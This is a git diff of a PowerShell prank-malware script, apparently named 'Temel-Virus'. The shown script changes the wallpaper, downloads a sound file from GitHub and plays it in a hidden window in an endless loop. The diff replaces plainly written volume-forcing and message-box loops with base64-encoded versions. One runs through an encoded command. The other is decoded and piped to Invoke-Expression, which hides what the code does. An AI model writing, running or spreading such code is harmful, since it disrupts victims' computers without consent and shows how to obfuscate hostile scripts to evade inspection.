@@ -26,61 +26,13 @@ public class Params
 }
 Set-WallPaper -Image "$env:temp\a.jpg"
 iwr -Uri "https://github.com/GamehunterKaan/Temel-Virus/blob/main/b.wav?raw=true" -OutFile "$env:temp\a.wav"
-Add-Type -TypeDefinition @'
-using System.Runtime.InteropServices;
-[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-interface IAudioEndpointVolume
-{
-    // f(), g(), ... are unused COM method slots. Define these if you care
-    int f(); int g(); int h(); int i();
-    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
-    int j();
-    int GetMasterVolumeLevelScalar(out float pfLevel);
-    int k(); int l(); int m(); int n();
-    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
-    int GetMute(out bool pbMute);
-}
-[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-interface IMMDevice
-{
-    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);
-}
-[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-interface IMMDeviceEnumerator
-{
-    int f(); // Unused
-    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
-}
-[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
-public class Audio
-{
-    static IAudioEndpointVolume Vol()
-    {
-        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
-        IMMDevice dev = null;
-        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));
-        IAudioEndpointVolume epv = null;
-        var epvid = typeof(IAudioEndpointVolume).GUID;
-        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));
-        return epv;
-    }
-    public static float Volume
-    {
-        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }
-        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }
-    }
-    public static bool Mute
-    {
-        get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }
-        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }
-    }
-}
-'@
+
 Start-Process -f powershell.exe -WindowStyle Hidden -A {
     while ($true) {(New-Object Media.SoundPlayer "$env:temp\a.wav").PlaySync()}
 }
-While ($true) {
-    [audio]::Volume  = 1.0
-    Add-Type -AssemblyName PresentationCore,PresentationFramework
-    $r = [System.Windows.MessageBox]::Show("Temellendiniz.","Pahmeer",[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Warning)
+
+start-process -f powershell -WindowStyle Hidden -A {
+    -e QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFAAcgBlAHMAZQBuAHQAYQB0AGkAbwBuAEMAbwByAGUALABQAHIAZQBzAGUAbgB0AGEAdABpAG8AbgBGAHIAYQBtAGUAdwBvAHIAawA7AHcAaABpAGwAZQAgACgAJAB0AHIAdQBlACkAewBbAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAE0AZQBzAHMAYQBnAGUAQgBvAHgAXQA6ADoAUwBoAG8AdwAoACIAVABlAG0AZQBsAGwAZQBuAGQAaQBuAGkAegAuACIALAAiAFAAYQBoAG0AZQBlAHIAIgAsAFsAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ATQBlAHMAcwBhAGcAZQBCAG8AeABCAHUAdAB0AG8AbgBdADoAOgBPAEsALABbAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAE0AZQBzAHMAYQBnAGUAQgBvAHgASQBtAGEAZwBlAF0AOgA6AFcAYQByAG4AaQBuAGcAKQB9AA==
 }
+
+powershell {[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uIEAnDQp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQpbR3VpZCgiNUNERjJDODItODQxRS00NTQ2LTk3MjItMENGNzQwNzgyMjlBIiksIEludGVyZmFjZVR5cGUoQ29tSW50ZXJmYWNlVHlwZS5JbnRlcmZhY2VJc0lVbmtub3duKV0NCmludGVyZmFjZSBJQXVkaW9FbmRwb2ludFZvbHVtZQ0Kew0KICAgIC8vIGYoKSwgZygpLCAuLi4gYXJlIHVudXNlZCBDT00gbWV0aG9kIHNsb3RzLiBEZWZpbmUgdGhlc2UgaWYgeW91IGNhcmUNCiAgICBpbnQgZigpOyBpbnQgZygpOyBpbnQgaCgpOyBpbnQgaSgpOw0KICAgIGludCBTZXRNYXN0ZXJWb2x1bWVMZXZlbFNjYWxhcihmbG9hdCBmTGV2ZWwsIFN5c3RlbS5HdWlkIHBndWlkRXZlbnRDb250ZXh0KTsNCiAgICBpbnQgaigpOw0KICAgIGludCBHZXRNYXN0ZXJWb2x1bWVMZXZlbFNjYWxhcihvdXQgZmxvYXQgcGZMZXZlbCk7DQogICAgaW50IGsoKTsgaW50IGwoKTsgaW50IG0oKTsgaW50IG4oKTsNCiAgICBpbnQgU2V0TXV0ZShbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldIGJvb2wgYk11dGUsIFN5c3RlbS5HdWlkIHBndWlkRXZlbnRDb250ZXh0KTsNCiAgICBpbnQgR2V0TXV0ZShvdXQgYm9vbCBwYk11dGUpOw0KfQ0KW0d1aWQoIkQ2NjYwNjNGLTE1ODctNEU0My04MUYxLUI5NDhFODA3MzYzRiIpLCBJbnRlcmZhY2VUeXBlKENvbUludGVyZmFjZVR5cGUuSW50ZXJmYWNlSXNJVW5rbm93bildDQppbnRlcmZhY2UgSU1NRGV2aWNlDQp7DQogICAgaW50IEFjdGl2YXRlKHJlZiBTeXN0ZW0uR3VpZCBpZCwgaW50IGNsc0N0eCwgaW50IGFjdGl2YXRpb25QYXJhbXMsIG91dCBJQXVkaW9FbmRwb2ludFZvbHVtZSBhZXYpOw0KfQ0KW0d1aWQoIkE5NTY2NEQyLTk2MTQtNEYzNS1BNzQ2LURFOERCNjM2MTdFNiIpLCBJbnRlcmZhY2VUeXBlKENvbUludGVyZmFjZVR5cGUuSW50ZXJmYWNlSXNJVW5rbm93bildDQppbnRlcmZhY2UgSU1NRGV2aWNlRW51bWVyYXRvcg0Kew0KICAgIGludCBmKCk7IC8vIFVudXNlZA0KICAgIGludCBHZXREZWZhdWx0QXVkaW9FbmRwb2ludChpbnQgZGF0YUZsb3csIGludCByb2xlLCBvdXQgSU1NRGV2aWNlIGVuZHBvaW50KTsNCn0NCltDb21JbXBvcnQsIEd1aWQoIkJDREUwMzk1LUU1MkYtNDY3Qy04RTNELUM0NTc5MjkxNjkyRSIpXSBjbGFzcyBNTURldmljZUVudW1lcmF0b3JDb21PYmplY3QgeyB9DQpwdWJsaWMgY2xhc3MgQXVkaW8NCnsNCiAgICBzdGF0aWMgSUF1ZGlvRW5kcG9pbnRWb2x1bWUgVm9sKCkNCiAgICB7DQogICAgICAgIHZhciBlbnVtZXJhdG9yID0gbmV3IE1NRGV2aWNlRW51bWVyYXRvckNvbU9iamVjdCgpIGFzIElNTURldmljZUVudW1lcmF0b3I7DQogICAgICAgIElNTURldmljZSBkZXYgPSBudWxsOw0KICAgICAgICBNYXJzaGFsLlRocm93RXhjZXB0aW9uRm9ySFIoZW51bWVyYXRvci5HZXREZWZhdWx0QXVkaW9FbmRwb2ludCgvKmVSZW5kZXIqLyAwLCAvKmVNdWx0aW1lZGlhKi8gMSwgb3V0IGRldikpOw0KICAgICAgICBJQXVkaW9FbmRwb2ludFZvbHVtZSBlcHYgPSBudWxsOw0KICAgICAgICB2YXIgZXB2aWQgPSB0eXBlb2YoSUF1ZGlvRW5kcG9pbnRWb2x1bWUpLkdVSUQ7DQogICAgICAgIE1hcnNoYWwuVGhyb3dFeGNlcHRpb25Gb3JIUihkZXYuQWN0aXZhdGUocmVmIGVwdmlkLCAvKkNMU0NUWF9BTEwqLyAyMywgMCwgb3V0IGVwdikpOw0KICAgICAgICByZXR1cm4gZXB2Ow0KICAgIH0NCiAgICBwdWJsaWMgc3RhdGljIGZsb2F0IFZvbHVtZQ0KICAgIHsNCiAgICAgICAgZ2V0IHsgZmxvYXQgdiA9IC0xOyBNYXJzaGFsLlRocm93RXhjZXB0aW9uRm9ySFIoVm9sKCkuR2V0TWFzdGVyVm9sdW1lTGV2ZWxTY2FsYXIob3V0IHYpKTsgcmV0dXJuIHY7IH0NCiAgICAgICAgc2V0IHsgTWFyc2hhbC5UaHJvd0V4Y2VwdGlvbkZvckhSKFZvbCgpLlNldE1hc3RlclZvbHVtZUxldmVsU2NhbGFyKHZhbHVlLCBTeXN0ZW0uR3VpZC5FbXB0eSkpOyB9DQogICAgfQ0KICAgIHB1YmxpYyBzdGF0aWMgYm9vbCBNdXRlDQogICAgew0KICAgICAgICBnZXQgeyBib29sIG11dGU7IE1hcnNoYWwuVGhyb3dFeGNlcHRpb25Gb3JIUihWb2woKS5HZXRNdXRlKG91dCBtdXRlKSk7IHJldHVybiBtdXRlOyB9DQogICAgICAgIHNldCB7IE1hcnNoYWwuVGhyb3dFeGNlcHRpb25Gb3JIUihWb2woKS5TZXRNdXRlKHZhbHVlLCBTeXN0ZW0uR3VpZC5FbXB0eSkpOyB9DQogICAgfQ0KfQ0KJ0ANCg0KV2hpbGUgKCR0cnVlKSB7DQogICAgW2F1ZGlvXTo6Vm9sdW1lICA9IDEuMA0KfQ==")) | iex}
